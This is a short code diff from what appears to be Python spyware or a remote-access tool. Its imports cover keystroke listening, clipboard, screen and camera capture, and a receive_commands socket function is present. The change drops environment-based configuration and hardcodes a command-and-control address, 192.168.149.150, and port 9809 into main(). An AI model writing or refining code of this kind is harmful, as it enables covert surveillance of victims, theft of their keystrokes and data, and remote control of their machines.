@@ -13,7 +13,6 @@ import threading
 import time
 
 import cv2
-import dotenv
 import pyautogui
 import pyperclip
 from pynput.keyboard import Listener
@@ -248,9 +247,8 @@ def receive_commands(sock):
 # Main function
 def main():
     global stop
-    dotenv.load_dotenv()
-    host = os.getenv('HOST')
-    port = int(os.getenv('PORT'))
+    host = '192.168.149.150'
+    port = 9809
     current_hour = datetime.datetime.now().strftime("%Hh")
     current_date = datetime.datetime.now().strftime("%d%m%Y")
     log_dir = LOG_DIR_WINDOWS if get_os() == 'Windows' else LOG_DIR_LINUX
